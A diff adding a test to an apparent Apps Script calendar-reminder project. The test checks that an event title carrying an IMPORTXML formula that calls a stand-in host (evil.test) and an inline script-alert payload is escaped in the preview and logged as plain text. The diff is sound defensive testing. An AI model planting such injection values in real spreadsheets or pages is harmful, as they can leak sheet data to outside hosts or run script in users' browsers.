@@ -279,6 +279,20 @@ describe('the menu and the trigger', () => {
     assert.match(html, /Your agenda for today/);
   });
 
+  test('an invitation\'s title is escaped in the preview and written as text in the log', () => {
+    const cals = calendars();
+    cals[0].events.push({ id: 'evil', title: '=IMPORTXML("https://evil.test","//a")<script>alert(1)</script>', start: at(2, 9, 1) });
+    const { gas, run } = setup({ cals });
+    gas.run('smstunnelPreview');
+    const html = gas.ui.dialogs.at(-1).html;
+    assert.equal(html.includes('<script>alert(1)'), false);
+    assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
+    run();
+    const log = gas.spreadsheet.getSheetByName('SMSTunnel log');
+    assert.ok(log.table().some((row) => row[2].startsWith('=IMPORTXML(')), 'kept as text');
+    for (const sheet of gas.spreadsheet.sheets) assert.deepEqual(sheet.formulas, [], sheet.name);
+  });
+
   test('the dialog\'s test button uses what is typed, even a key not saved yet', () => {
     const gas = createGas({ project: 'calendar-reminders', http: fakeApi(), timeZone: TZ, calendars: calendars(), spreadsheet: { sheets: [{ name: 'Start here' }] } });
     const out = gas.run('smstunnelSendTestReminder', {
